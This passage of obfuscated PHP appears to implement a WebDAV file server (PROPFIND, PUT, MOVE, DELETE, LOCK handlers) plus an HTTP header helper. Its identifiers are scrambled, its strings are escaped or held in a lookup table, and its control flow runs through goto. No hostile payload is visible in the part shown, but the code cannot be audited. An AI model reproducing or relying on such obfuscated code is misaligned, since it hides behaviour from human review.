strpos($C—³Ó¿„², $this->urlBase) + strlen($this->urlBase)); } public function pathExists($a¢ãÇÁ‰Ó“) { return file_exists($a¢ãÇÁ‰Ó“); } public function pathMkdir($a¢’Ç©÷‘¸) { return mkdir($a¢’Ç©÷‘¸, 511, !0); } public function pathInfo($Cáå–Ñç… ) { return path_info($Cáå–Ñç… ); } public function pathList($cŠ¾Ä»¨•‘) { return path_list($cŠ¾Ä»¨•‘); } public function pathOut($fƒ±Ê”Ù÷–) { echo file_get_contents($fƒ±Ê”Ù÷–); } public function pathPut($CŒÛ²š²ªä, $a•·åÊ¸Óå = '') { if (!$a•·åÊ¸Óå) { return file_put_contents($CŒÛ²š²ªä, $_SERVER[¨¤¼…´][43]); } return move_path($a•·åÊ¸Óå, $CŒÛ²š²ªä); } public function pathRemove($bÀ±˜¼·ˆ) { if (is_file($bÀ±˜¼·ˆ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($F†»¯“ÆÕ“, $a¡¼¦°›ç) { return move_path($F†»¯“ÆÕ“, $a¡¼¦°›ç); } public function pathCopy($e¼–™ô’Ñô, $cÄ³ö‘êî) { return copy_dir($e¼–™ô’Ñô, $cÄ³ö‘êî); } public function parsePath($B›™Ù¼¡ã‡) { return $B›™Ù¼¡ã‡; } public function parseItem($fÌ¼ì—æƒ, $a™ˆ£±›å“) { goto D›ñëõË•ä; FîçÖÍ¶ßº: $C”–œÎ‹ƒ = array($F¡òßÏÃÔ‰[1777] => KodIO::clear($this->urlBase . $d¼†ù½×ì), $F¡òßÏÃÔ‰[117] => @gmdate($F¡òßÏÃÔ‰[1778], $fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[117]]), $F¡òßÏÃÔ‰[201] => @gmdate($F¡òßÏÃÔ‰[1779], $fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[201]]), $F¡òßÏÃÔ‰[87] => $fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[87]] ? $fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[87]] : 0); return $C”–œÎ‹ƒ; goto e‘»™¬Ÿõœ; dÜ„Ë”†¡İ: if ($a™ˆ£±›å“) { $d¼†ù½×ì = $F¡òßÏÃÔ‰[8] . str_replace($F¡òßÏÃÔ‰[186], $F¡òßÏÃÔ‰[8], rawurlencode($this->pathGet())); } if (!trim($fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[117]])) { $fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[117]] = time(); } if (!trim($fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[201]])) { $fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[201]] = time(); } goto FîçÖÍ¶ßº; D›ñëõË•ä: $F¡òßÏÃÔ‰ =& $_SERVER[¨¤¼…´]; $d¼†ù½×ì = $this->pathGet() . $F¡òßÏÃÔ‰[8] . $fÌ¼ì—æƒ[$F¡òßÏÃÔ‰[38]]; $d¼†ù½×ì = $F¡òßÏÃÔ‰[8] . str_replace($F¡òßÏÃÔ‰[186], $F¡òßÏÃÔ‰[8], rawurlencode($d¼†ù½×ì)); goto dÜ„Ë”†¡İ; e‘»™¬Ÿõœ: } public function parseItemXml($A•ë‡Ç’ñø, $f”Ê¼ ÇŒÌ) { $B®ÆÊí‰Ì =& $_SERVER[¨¤¼…´]; $DàŸ°ƒ™® = $this->parseItem($A•ë‡Ç’ñø, $f”Ê¼ ÇŒÌ); if ($A•ë‡Ç’ñø[$B®ÆÊí‰Ì[39]] == $B®ÆÊí‰Ì[86]) { $bÈ´ Üäóˆ = $B®ÆÊí‰Ì[1780]; $bÈ´ Üäóˆ .= $B®ÆÊí‰Ì[1781]; } else { $aĞÑÆƒ‚¬‘ = $A•ë‡Ç’ñø[$B®ÆÊí‰Ì[175]] ? $A•ë‡Ç’ñø[$B®ÆÊí‰Ì[175]] : get_path_ext($A•ë‡Ç’ñø[$B®ÆÊí‰Ì[38]]); $DÃèÃÏšŞË = get_file_mime($aĞÑÆƒ‚¬‘); $bÈ´ Üäóˆ = $B®ÆÊí‰Ì[1782]; $bÈ´ Üäóˆ .= "\x3c\104\72\x67\145\164\x63\157\x6e\x74\x65\x6e\164\x74\171\160\145\x3e{$DÃèÃÏšŞË}\x3c\x2f\x44\72\x67\145\164\x63\x6f\x6e\x74\145\156\164\164\x79\160\x65\x3e"; } return "\12\11\11\74\104\x3a\x72\145\x73\x70\x6f\x6e\x73\145\x3e\xa\11\11\11\74\104\x3a\150\162\x65\146\76{$DàŸ°ƒ™®[$B®ÆÊí‰Ì[1777]]}\x3c\57\104\x3a\x68\162\145\x66\x3e\xa\11\x9\11\74\x44\72\x70\x72\157\x70\163\164\141\x74\76\xa\11\11\x9\11\74\104\x3a\160\162\157\160\x3e\xa\11\11\11\11\x9\74\x44\72\x67\x65\164\154\141\163\164\x6d\157\x64\151\x66\x69\x65\144\x3e{$DàŸ°ƒ™®[$B®ÆÊí‰Ì[117]]}\x3c\x2f\104\x3a\x67\145\164\x6c\x61\x73\164\x6d\157\x64\151\146\x69\x65\x64\76\xa\x9\11\11\11\x9\x3c\x44\x3a\x63\x72\145\141\164\x69\x6f\x6e\144\141\x74\x65\76{$DàŸ°ƒ™®[$B®ÆÊí‰Ì[201]]}\x3c\x2f\104\x3a\143\162\x65\141\x74\x69\157\x6e\x64\141\x74\x65\x3e\12\x9\11\x9\x9\x9\x3c\x44\x3a\x67\145\x74\143\x6f\156\164\x65\x6e\164\154\145\156\147\164\x68\x3e{$DàŸ°ƒ™®[$B®ÆÊí‰Ì[87]]}\x3c\x2f\x44\x3a\x67\x65\164\143\x6f\156\164\x65\156\164\154\x65\156\147\x74\150\x3e\12\x9\11\x9\11\11{$bÈ´ Üäóˆ}\12\11\x9\x9\11\74\x2f\x44\x3a\160\x72\157\160\76\xa\x9\x9\11\x9\74\x44\72\163\x74\141\164\x75\163\x3e\x48\x54\x54\120\57\x31\56\61\x20\62\x30\x30\40\117\x4b\x3c\57\104\x3a\163\x74\141\x74\165\163\76\12\11\11\11\x3c\57\x44\x3a\160\162\157\x70\163\x74\141\164\76\xa\11\x9\x3c\57\104\72\x72\x65\163\160\157\x6e\163\145\x3e"; } public function pathListMerge($CïÒÛ‰é‡–) { goto a„‡Ş†„èè; a„‡Ş†„èè: $eÓ»Õ¸Ù¥Á =& $_SERVER[¨¤¼…´]; if (!$CïÒÛ‰é‡–) { return $CïÒÛ‰é‡–; } $Bî——®èë = array($eÓ»Õ¸Ù¥Á[83], $eÓ»Õ¸Ù¥Á[84], $eÓ»Õ¸Ù¥Á[1783]); goto BÀÔŸ«ˆ™¢; BÀÔŸ«ˆ™¢: $B—å×º•®¦ = array(); foreach ($CïÒÛ‰é‡– as $AßåŒ§›­ => $E†‰Æ¨¥¶) { if (!in_array($AßåŒ§›­, $Bî——®èë) || !is_array($E†‰Æ¨¥¶)) { continue; } $B—å×º•®¦ = array_merge($B—å×º•®¦, $E†‰Æ¨¥¶); } foreach ($B—å×º•®¦ as &$Ağ„¦——»Ó) { $Ağ„¦——»Ó[$eÓ»Õ¸Ù¥Á[38]] = str_replace($eÓ»Õ¸Ù¥Á[8], $eÓ»Õ¸Ù¥Á[1378], $Ağ„¦——»Ó[$eÓ»Õ¸Ù¥Á[38]]); } goto C¢ŸåšîÔ; C¢ŸåšîÔ: unset($Ağ„¦——»Ó); return $B—å×º•®¦; goto D‰½Ä‡ÉµŒ; D‰½Ä‡ÉµŒ: } public function httpPROPFIND() { goto DÁ×é‰«ƒº; f¨¹Â”ö¦: if ($d—óØÒˆî¤) { $FÔ ¾¬¶ÏÓ = array($cê±—¶èÌ); } else { $cê±—¶èÌ[$aÔ‰³÷º[38]] = $aÔ‰³÷º[43]; $FÔ ¾¬¶ÏÓ = array_merge(array($cê±—¶èÌ), $FÔ ¾¬¶ÏÓ); } $B‹ê÷ê†¿È = $aÔ‰³÷º[43]; foreach ($FÔ ¾¬¶ÏÓ as $cŸ–ÄÏ»³‡) { $B‹ê÷ê†¿È .= $this->parseItemXml($cŸ–ÄÏ»³‡, $d—óØÒˆî¤); } goto C·èˆ¬Í×î; C·èˆ¬Í×î: return array($aÔ‰³÷º[1786] => 207, $aÔ‰³÷º[1787] => "\74\104\72\155\165\x6c\164\151\163\x74\x61\x74\x75\163\40\x78\155\154\156\x73\x3a\104\75\42\x44\101\126\x3a\x22\x3e\12{$B‹ê÷ê†¿È}\12\74\57\x44\x3a\x6d\x75\154\164\151\163\164\x61\x74\165\x73\76"); goto f•è´Åª™Ì; DÁ×é‰«ƒº: $aÔ‰³÷º =& $_SERVER[¨¤¼…´]; $C—„ÏÄ¯©Î = $this->pathList($this->path); $FÔ ¾¬¶ÏÓ = $this->pathListMerge($C—„ÏÄ¯©Î); goto CÁ­±™ÆÇ; CÁ­±™ÆÇ: $cê±—¶èÌ = $C—„ÏÄ¯©Î[$aÔ‰³÷º[1784]]; if (!is_array($FÔ ¾¬¶ÏÓ) || $cê±—¶èÌ[$aÔ‰³÷º[1785]] === !1) { return array($aÔ‰³÷º[1786] => 404, $aÔ‰³÷º[1787] => $aÔ‰³÷º[1788]); } $d—óØÒˆî¤ = $cê±—¶èÌ[$aÔ‰³÷º[39]] == $aÔ‰³÷º[181] || HttpHeader::get($aÔ‰³÷º[1763]) == $aÔ‰³÷º[481]; goto f¨¹Â”ö¦; f•è´Åª™Ì: } public function httpHEAD() { $DµÇõ¯–‚ =& $_SERVER[¨¤¼…´]; $c“Ã¸Èµ²Ş = $this->pathInfo($this->path); if (!$c“Ã¸Èµ²Ş || $c“Ã¸Èµ²Ş[$DµÇõ¯–‚[39]] == $DµÇõ¯–‚[86]) { return array($DµÇõ¯–‚[1023] => 200, $DµÇõ¯–‚[1197] => array($DµÇõ¯–‚[1789])); } return array($DµÇõ¯–‚[1023] => 200, $DµÇõ¯–‚[1197] => array($DµÇõ¯–‚[1790], $DµÇõ¯–‚[146], $DµÇõ¯–‚[1791] . $c“Ã¸Èµ²Ş[$DµÇõ¯–‚[87]], $DµÇõ¯–‚[1792] . get_file_mime($c“Ã¸Èµ²Ş[$DµÇõ¯–‚[175]]), $DµÇõ¯–‚[142] . gmdate($DµÇõ¯–‚[1778], $c“Ã¸Èµ²Ş[$DµÇõ¯–‚[1243]]) . $DµÇõ¯–‚[1793], $DµÇõ¯–‚[1794])); } public function httpOPTIONS() { $cå¯øğÜÎ =& $_SERVER[¨¤¼…´]; return array($cå¯øğÜÎ[1023] => 200, $cå¯øğÜÎ[1197] => array($cå¯øğÜÎ[1795], $cå¯øğÜÎ[1796], $cå¯øğÜÎ[1797], $cå¯øğÜÎ[1252])); } public function httpPROPPATCH() { $FÕÚÇ³Èİ =& $_SERVER[¨¤¼…´]; $b‡é¿îÍ’× = $FÕÚÇ³Èİ[1798] . $_SERVER[$FÕÚÇ³Èİ[1376]] . $FÕÚÇ³Èİ[1799]; return array($FÕÚÇ³Èİ[1786] => 207, $FÕÚÇ³Èİ[1787] => "\x3c\x44\72\155\x75\x6c\164\151\163\164\141\164\165\163\x20\x78\x6d\154\156\x73\72\104\x3d\x22\x44\x41\126\72\x22\76\xa{$b‡é¿îÍ’×}\12\x3c\x2f\x44\x3a\x6d\165\154\x74\x69\x73\164\x61\x74\165\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $d‰˜óÅê =& $_SERVER[¨¤¼…´]; $a•¶…Èğ¡í = $this->uploadFile(); if ($a•¶…Èğ¡í) { $E•ÒÁÀ†å = 204; } else { $a•¶…Èğ¡í = $d‰˜óÅê[43]; $E•ÒÁÀ†å = 201; } $fã‘‚¿ÚŞ˜ = $this->pathPut($this->path, $a•¶…Èğ¡í); if ($fã‘‚¿ÚŞ˜ == !1) { $E•ÒÁÀ†å = 404; } return array($d‰˜óÅê[1786] => $E•ÒÁÀ†å); } private function uploadFile() { goto BÛóƒĞ; aØ—´É‘—˜: $bŒ¼Óíñøğ = @fopen($EÄ’”†É¯, $fòç¥ª£™‹[1510]); $F¬½Í«ßö = @fopen($fòç¥ª£™‹[1801], $fòç¥ª£™‹[1509]); if (!$F¬½Í«ßö || !$bŒ¼Óíñøğ) { @unlink($EÄ’”†É¯); return !1; } goto EÓŠÂğ“æ; EÓŠÂğ“æ: while (!feof($F¬½Í«ßö)) { fwrite($bŒ¼Óíñøğ, fread($F¬½Í«ßö, 1024 * 200)); } fclose($F¬½Í«ßö); fclose($bŒ¼Óíñøğ); goto f„Óàä¼æá; f„Óàä¼æá: if (@filesize_64($EÄ’”†É¯) > 0) { return $EÄ’”†É¯; } @unlink($EÄ’”†É¯); return !1; goto bÊ¤‰‰ë—Ã; BÛóƒĞ: $fòç¥ª£™‹ =& $_SERVER[¨¤¼…´]; @mk_dir(TEMP_FILES); $EÄ’”†É¯ = TEMP_FILES . $fòç¥ª£™‹[1800] . rand_string(32); goto aØ—´É‘—˜; bÊ¤‰‰ë—Ã: } public function httpMKCOL() { $fØø¶îí¹ =& $_SERVER[¨¤¼…´]; if ($this->pathExists($this->path)) { return array($fØø¶îí¹[1023] => 409); } $A‘áÔÂÒ†È = $this->pathMkdir($this->path); return array($fØø¶îí¹[1023] => $A‘áÔÂÒ†È ? 201 : 403); } public function httpMOVE() { $BË¿ÑĞ©Ğ =& $_SERVER[¨¤¼…´]; $fƒŠ…¦–‹Œ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$BË¿ÑĞ©Ğ[1802]])) { $D«†öì«ì•[$BË¿ÑĞ©Ğ[1803]] = $_SERVER[$BË¿ÑĞ©Ğ[1802]] == $BË¿ÑĞ©Ğ[1804]; } $aÆ”Ã¥˜¼ = $this->pathMove($this->path, $fƒŠ…¦–‹Œ); return array($BË¿ÑĞ©Ğ[1023] => $aÆ”Ã¥˜¼ ? 201 : 404); } public function httpCOPY() { $A’Š¹Ä¦æ = $this->parsePath($this->pathGet(!0)); $Aµ½Æ¡º© = $this->pathCopy($this->path, $A’Š¹Ä¦æ); return array($_SERVER[¨¤¼…´][1023] => $Aµ½Æ¡º© ? 201 : 404); } public function httpDELETE() { $dã›¾ÅÁ† = $this->pathRemove($this->path); return array($_SERVER[¨¤¼…´][1023] => $dã›¾ÅÁ† ? 200 : 503); } public function httpLOCK() { $Bä„„ÌÇÜ› =& $_SERVER[¨¤¼…´]; $C¹§çğï‚ = md5($this->path); $eÕ¥ºµÎÃ‹ = $Bä„„ÌÇÜ›[1805] . $this->xmlGet($Bä„„ÌÇÜ›[1806]) . $Bä„„ÌÇÜ›[1807] . $C¹§çğï‚ . $Bä„„ÌÇÜ›[1808]; return array($Bä„„ÌÇÜ›[1023] => 200, $Bä„„ÌÇÜ›[1197] => array($Bä„„ÌÇÜ›[1809] . $C¹§çğï‚, $Bä„„ÌÇÜ›[1810]), $Bä„„ÌÇÜ›[1811] => $eÕ¥ºµÎÃ‹); } public function httpUNLOCK() { return array($_SERVER[¨¤¼…´][1023] => 204); } public function xmlGet($D›Á‹‘­) { goto D÷µÏ˜ôÒ; F„›Û»’»í: if ($FàœŠƒ”å) { return $FàœŠƒ”å[0]->nodeValue; } return $E£Ê³×İ®[43]; goto dàª¿µ‰òõ; fç†Õ”¤Ò”: $B…ì›æ°â = explode($E£Ê³×İ®[8], $D›Á‹‘­); $DÆÚ…ã¡íï = array_shift($B…ì›æ°â); $FàœŠƒ”å = $Añ”ê’‡å->getElementsByTagNameNS($E£Ê³×İ®[1813], $DÆÚ…ã¡íï); goto F„›Û»’»í; D÷µÏ˜ôÒ: $E£Ê³×İ® =& $_SERVER[¨¤¼…´]; static $Añ”ê’‡å = false; if (!$Añ”ê’‡å) { $FÎ¾ğ”‰¼‰ = file_get_contents($E£Ê³×İ®[1812]); $Añ”ê’‡å = new DOMDocument(); $Añ”ê’‡å->loadXML($FÎ¾ğ”‰¼‰); } goto fç†Õ”¤Ò”; dàª¿µ‰òõ: } public static function response($C‡œ›Éøï) { goto E„ÃÖŠº; b¿ÚÅ«¶Ñµ: $fÅ¤ÄÀ–™ï[] = $F¹·ŸæİÓ[1753]; $fÅ¤ÄÀ–™ï[] = $F¹·ŸæİÓ[1754]; foreach ($fÅ¤ÄÀ–™ï as $A¬„Ğáš‹¯) { header($A¬„Ğáš‹¯); } goto a›ÇÙÓİƒË; a›ÇÙÓİƒË: if (is_string($C‡œ›Éøï[$F¹·ŸæİÓ[1811]])) { header($F¹·ŸæİÓ[1814]); $fÒ”ƒí³Õ = $F¹·ŸæİÓ[1815] . $F¹·ŸæİÓ[14] . $C‡œ›Éøï[$F¹·ŸæİÓ[1811]]; echo $fÒ”ƒí³Õ; } goto C×½ßƒ§Í­; E„ÃÖŠº: $F¹·ŸæİÓ =& $_SERVER[¨¤¼…´]; $fÅ¤ÄÀ–™ï = is_array($C‡œ›Éøï[$F¹·ŸæİÓ[1197]]) ? $C‡œ›Éøï[$F¹·ŸæİÓ[1197]] : array(); $fÅ¤ÄÀ–™ï[] = HttpHeader::code($C‡œ›Éøï[$F¹·ŸæİÓ[1023]]); goto b¿ÚÅ«¶Ñµ; C×½ßƒ§Í­: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\x48\x54\x54\x50\x5f\110\x4f\123\x54", "\125\163\145\162\55\x41\147\x65\156\164" => "\110\x54\x54\120\x5f\x55\123\105\x52\x5f\x41\x47\105\x4e\124", "\x43\157\x6e\x74\145\156\164\x2d\124\x79\160\x65" => "\x48\x54\x54\x50\137\x43\117\116\x54\105\116\124\x5f\124\x59\x50\105", "\x43\157\x6e\164\145\x6e\164\x2d\114\145\156\x67\x74\x68" => "\110\x54\124\x50\137\x43\x4f\116\124\x45\116\x54\x5f\x4c\105\x4e\x47\124\110", "\104\x65\160\164\150" => "\110\x54\124\120\137\x44\x45\120\x54\110", "\105\x78\x70\x65\143\164" => "\110\124\x54\120\x5f\105\x58\120\105\x43\x54", "\111\146\55\x4e\x6f\x6e\x65\x2d\x4d\x61\x74\143\150" => "\x48\124\x54\120\x5f\x49\106\137\116\117\116\x45\x5f\115\101\124\x43\x48", "\x49\146\55\x4d\x61\x74\143\x68" => "\x48\124\x54\x50\137\111\x46\x5f\115\x41\124\x43\110", "\111\146\x2d\x52\x61\x6e\147\145" => "\x48\x54\124\120\137\x49\x46\x5f\x52\x41\x4e\107\105", "\x4c\141\x73\x74\x2d\115\x6f\x64\151\146\151\145\x64" => "\110\124\124\120\137\x4c\x41\x53\124\x5f\x4d\117\104\x49\106\x49\x45\x44", "\111\146\x2d\x4d\157\x64\x69\146\x69\145\144\55\123\151\x6e\x63\x65" => "\x48\124\x54\x50\137\x49\106\137\x4d\x4f\104\111\x46\x49\105\104\137\x53\x49\116\x43\x45", "\x49\146\x2d\125\x6e\155\157\144\151\146\151\x65\x64\x2d\x53\151\156\x63\145" => "\110\124\124\120\137\111\x46\x5f\125\116\x4d\x4f\x44\x49\x46\111\x45\104\x5f\123\x49\116\103\x45", "\122\141\x6e\x67\x65" => "\x48\x54\124\120\x5f\x52\x41\x4e\107\105", "\124\151\155\x65\x6f\165\164" => "\x48\124\x54\x50\137\124\111\115\105\117\x55\124", "\x49\146" => "\x48\124\124\120\x5f\111\x46", "\114\157\x63\153\x2d\x54\157\153\145\156" => "\x48\x54\124\120\137\114\x4f\103\x4b\137\x54\117\113\x45\116", "\117\x76\145\x72\x77\x72\151\x74\x65" => "\x48\124\x54\120\137\x4f\126\105\122\127\x52\x49\x54\105", "\104\x65\163\x74\x69\x6e\141\164\x69\x6f\x6e" => "\x48\124\x54\x50\x5f\x44\x45\123\x54\x49\x4e\x41\x54\x49\117\x4e", "\x52\x65\161\165\x65\x73\164\x2d\111\144" => "\122\x45\x51\x55\105\123\124\137\111\104", "\x52\x65\161\165\x65\163\164\x2d\102\x6f\x64\x79\55\x46\151\154\145" => "\122\105\121\x55\105\x53\124\x5f\102\x4f\x44\x59\137\x46\111\114\x45", "\122\145\x64\x69\x72\x65\143\x74\55\x53\x74\x61\x74\x75\163" => "\122\x45\104\111\122\x45\x43\x54\137\123\x54\x41\x54\125\x53"); public static function init() { static $E±µèßö• = false; if ($E±µèßö•) { return; } foreach ($_SERVER as $Dç‡Œ³ãÜÖ => $aÄ¯‹‹íÁ) { $Dç‡Œ³ãÜÖ = strtoupper($Dç‡Œ³ãÜÖ); if (!array_key_exists($Dç‡Œ³ãÜÖ, $_SERVER)) { continue; } $_SERVER[$Dç‡Œ³ãÜÖ] = $aÄ¯‹‹íÁ; } foreach (self::$_headers as $Dç‡Œ³ãÜÖ => $Dø…õ‰ôÏñ) { if (!array_key_exists($Dç‡Œ³ãÜÖ, $_SERVER)) { continue; } $_SERVER[$Dç‡Œ³ãÜÖ] = $_SERVER[$Dø…õ‰ôÏñ]; $_SERVER[strtoupper($Dç‡Œ³ãÜÖ)] = $_SERVER[$Dø…õ‰ôÏñ]; } } public static function get($Aç±‡›È×) { self::init(); return $_SERVER[$Aç±‡›È×] ? $_SERVER[$Aç±‡›È×] : $_SERVER[$_SERVER[¨¤¼…´][1816] . strtoupper($Aç±‡›È×)]; } public static function method() { return strtoupper(self::get($_SERVER[¨¤¼…´][164])); } public static function length() { $aˆÅÎÜæ‚Ø =& $_SERVER[¨¤¼…´]; $A—…ÚÜà‚ã = self::get($aˆÅÎÜæ‚Ø[1817]); if (!$A—…ÚÜà‚ã) { $A—…ÚÜà‚ã = self::get($aˆÅÎÜæ‚Ø[1136]); } return $A—…ÚÜà‚ã; } public static function range() { $b½à•áÆÂ« =& $_SERVER[¨¤¼…´]; $fÜÁŸ¶’ãõ = self::get($b½à•áÆÂ«[212]); if (!$fÜÁŸ¶’ãõ) { return !1; } if (!preg_match($b½à•áÆÂ«[1818], $fÜÁŸ¶’ãõ, $AÀØˆ Š¾ø)) { return !1; } if ($AÀØˆ Š¾ø[1] === $b½à•áÆÂ«[43] && $AÀØˆ Š¾ø[2] === $b½à•áÆÂ«[43]) { return !1; } return array($AÀØˆ Š¾ø[1] !== $b½à•áÆÂ«[43] ? $AÀØˆ Š¾ø[1] : null, $AÀØˆ Š¾ø[2] !== $b½à•áÆÂ«[43] ? $AÀØˆ Š¾ø[2] : null); } public static $statusCode = array("\61\x30\x30" => "\103\157\156\x74\x69\156\x75\x65", "\61\60\61" => "\x53\167\151\x74\x63\x68\x69\156\147\40\120\162\x6f\164\x6f\x63\157\x6c", "\x31\x30\x32" => "\x50\x72\157\x63\x65\x73\x73\x69\x6e\x67", "\x31\60\63" => "\x45\x61\162\154\x79\x20\110\x69\156\x74\x73", "\x32\60\x30" => "\117\x4b", "\x32\x30\61" => "\x43\x72\x65\141\164\x65\144", "\x32\x30\x32" => "\x41\143\143\x65\160\164\x65\144", "\x32\60\x33" => "\x4e\157\156\55\x41\x75\x74\x68\x6f\162\x69\x74\141\x74\151\166\x65\40\111\156\146\157\x72\x6d\141\164\151\x6f\156", "\x32\x30\x34" => "\x4e\157\40\x43\157\156\164\x65\156\x74", "\x32\60\x35" => "\122\x65\163\145\164\x20\103\157\x6e\x74\145\156\164", "\x32\60\66" => "\x50\141\162\x74\151\141\154\x20\x43\157\156\x74\x65\156\x74", "\62\x30\67" => "\x4d\x75\x6c\x74\x69\55\x53\164\141\x74\165\163", "\x33\60\x30" => "\115\165\154\x74\x69\160\x6c\145\x20\x43\150\157\151\x63\145\163", "\x33\x30\x31" => "\115\157\x76\145\x64\x20\x50\145\x72\155\141\x6e\145\x6e\164\154\171", "\x33\60\62" => "\x46\157\x75\156\144", "\x33\x30\x33" => "\x53\x65\x65\40\x4f\x74\150\x65\162", "\x33\x30\64" => "\116\x6f\x74\40\x4d\x6f\144\x69\x66\x69\145\144", "\63\60\65" => "\125\163\x65\x20\120\162\x6f\x78\171", "\63\60\67" => "\x54\145\155\x70\x6f\x72\141\x72\x79\x20\x52\x65\144\151\x72\145\143\x74", "\x33\x30\70" => "\120\x65\162\x6d\141\x6e\145\x6e\164\x20\122\145\144\151\x72\145\143\x74", "\64\60\x30" => "\102\141\144\40\122\145\x71\x75\145\163\164", "\64\60\x31" => "\x55\x6e\x61\165\x74\150\157\x72\x69\x7a\x65\x64", "\x34\60\62" => "\x50\x61\171\155\145\x6e\x74\40\x52\145\x71\x75\151\162\145\x64", "\x34\60\63" => "\106\157\x72\x62\151\x64\144\x65\x6e", "\64\x30\64" => "\116\157\164\x20\x46\x6f\165\156\144", "\64\x30\x35" => "\x4d\x65\164\x68\x6f\144\40\116\x6f\164\40\101\x6c\x6c\x6f\x77\x65\x64", "\x34\60\x36" => "\116\157\x74\40\101\143\x63\145\160\x74\x61\x62\x6c\x65", "\64\60\x37" => "\x50\162\x6f\x78\171\x20\101\165\164\x68\145\x6e\x74\x69\143\x61\164\151\x6f\x6e\x20\x52\x65\x71\165\x69\x72\145\144", "\64\x30\x38" => "\122\x65\x71\x75\x65\x73\x74\40\x54\151\155\145\x6f\x75\164", "\x34\x30\71" => "\103\x6f\x6e\146\154\x69\x63\x74", "\x34\61\60" => "\107\157\x6e\x65", "\64\x31\x31" => "\114\145\156\x67\x74\x68\x20\x52\145\161\165\x69\162\145\x64", "\64\61\x32" => "\x50\162\145\143\157\156\x64\x69\x74\x69\x6f\x6e\x20\106\141\x69\x6c\x65\144", "\64\61\x33" => "\x52\x65\161\x75\x65\x73\x74\x20\105\x6e\x74\x69\164\171\40\124\157\157\x20\114\141\162\x67\145", "\64\61\x34" => "\122\x65\161\165\x65\x73\164\x20\125\122\x49\x20\x54\x6f\x6f\x20\x4c\x61\162\147\x65", "\x34\61\x35" => "\x55\x6e\x73\165\160\160\157\x72\x74\x65\x64\x20\115\145\144\151\141\x20\x54\171\x70\x65", "\64\x31\66" => "\122\145\161\165\x65\x73\x74\x65\144\x20\122\141\x6e\147\x65\40\x4e\157\164\x20\123\x61\164\x69\163\146\151\x61\x62\x6c\145", "\64\x31\67" => "\x45\x78\160\x65\x63\x74\x61\164\x69\x6f\156\40\x46\x61\151\x6c\145\144", "\x34\62\x32" => "\125\156\160\x72\157\x63\x65\163\x73\141\x62\154\x65\40\105\x6e\x74\151\x74\171", "\x34\x32\x33" => "\114\157\143\x6b\145\x64", "\64\x32\64" => "\106\141\x69\x6c\x65\x64\40\104\x65\160\145\x6e\144\145\x6e\x63\x79", "\x34\x32\65" => "\x55\x6e\x6f\162\144\x65\x72\x65\x64\x20\103\x6f\x6c\x6c\x65\143\164\151\x6f\x6e", "\x34\x32\66" => "\x55\160\147\162\x61\x64\145\x20\122\x65\x71\x75\151\x72\145\144", "\64\x32\x38" => "\120\162\145\x63\x6f\156\x64\x69\x74\151\x6f\x6e\x20\x52\x65\x71\x75\151\x72\145\x64", "\x34\62\71" => "\x54\157\x6f\40\115\141\156\171\40\122\145\x71\165\x65\x73\164\x73", "\x34\x33\x31" => "\x52\x65\x71\x75\x65\163\x74\x20\x48\145\x61\144\x65\x72\x20\106\x69\145\x6c\x64\163\40\124\157\x6f\x20\x4c\141\162\x67\x65", "\64\64\64" => "\x4e\157\40\122\145\163\160\157\x6e\163\x65", "\64\x35\60" => "\x42\x6c\157\143\x6b\145\x64\x20\142\171\x20\127\x69\x6e\x64\x6f\x77\x73\x20\120\141\162\145\x6e\x74\141\x6c\x20\x43\157\x6e\164\x72\x6f\x6c\163", "\64\x35\x31" => "\125\156\x61\x76\x61\151\x6c\141\x62\x6c\145\40\106\x6f\162\x20\x4c\x65\147\x61\x6c\40\122\x65\141\163\157\x6e\x73", "\64\71\64" => "\x52\x65\x71\165\145\163\x74\x20\x48\145\141\144\145\162\40\x54\157\x6f\40\114\x61\162\x67\145", "\x35\60\60" => "\111\x6e\164\145\162\x6e\x61\x6c\x20\x53\x65\x72\166\x65\162\x20\105\x72\x72\x6f\162", "\65\60\x31" => "\116\x6f\x74\x20\111\155\160\154\145\x6d\145\x6e\164\145\144", "\x35\60\62" => "\102\x61\x64\40\107\x61\x74\145\167\141\171", "\65\x30\x33" => "\x53\x65\x72\x76\151\143\x65\x20\x55\156\x61\166\141\x69\x6c\x61\142\154\145", "\x35\60\x34" => "\107\x61\164\x65\167\141\171\40\124\x69\x6d\x65\157\165\164", "\x35\x30\65" => "\110\124\x54\120\x20\126\x65\x72\x73\151\157\x6e\x20\156\157\164\40\x73\x75\160\x70\x6f\162\x74\145\x64", "\65\60\67" => "\111\x6e\163\165\146\x66\151\x63\151\x65\156\164\40\123\x74\157\162\x61\x67\145"); public static function code($AÎªùõ‚¢’) { $A£‘ÎÓİÕ¬ =& $_SERVER[¨¤¼…´]; $AÎªùõ‚¢’ = $AÎªùõ‚¢’ . $A£‘ÎÓİÕ¬[43]; $aÎùôªŸ¸„ = self::$statusCode[$AÎªùõ‚¢’]; $aÎùôªŸ¸„ = $aÎùôªŸ¸„ ? "\110\x54\124\x50\57\61\56\x31\x20{$AÎªùõ‚¢’}\40" . $aÎùôªŸ¸„ : $A£‘ÎÓİÕ¬[43]; return $aÎùôªŸ¸„; } } goto DªîŞœİ¹Å; aµËÜÎ‰Ã: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($C¬ŞÆ‹¬ğœ) { $cäâìãÁ£Ê =& $_SERVER[¨¤¼…´]; return array($cäâìãÁ£Ê[2191] => array(USER_ID, $cäâìãÁ£Ê[2192])); } protected function listData() { $a§¢åÏ¨é =& $_SERVER[¨¤¼…´]; $d‹ŠÜ²´± = array($a§¢åÏ¨é[1416] => USER_ID, $a§¢åÏ¨é[447] => array($a§¢åÏ¨é[2195], 0)); $C´¶†œ»Š« = $a§¢åÏ¨é[2197]; $B¨îª„–’ = $this->field($C´¶†œ»Š«)->where($d‹ŠÜ²´±)->order($a§¢åÏ¨é[2198])->select(); return $B¨îª„–’ ? $B¨îª„–’ : array(); } protected function listByTag($BæÆÏ·Äãò) { } protected function 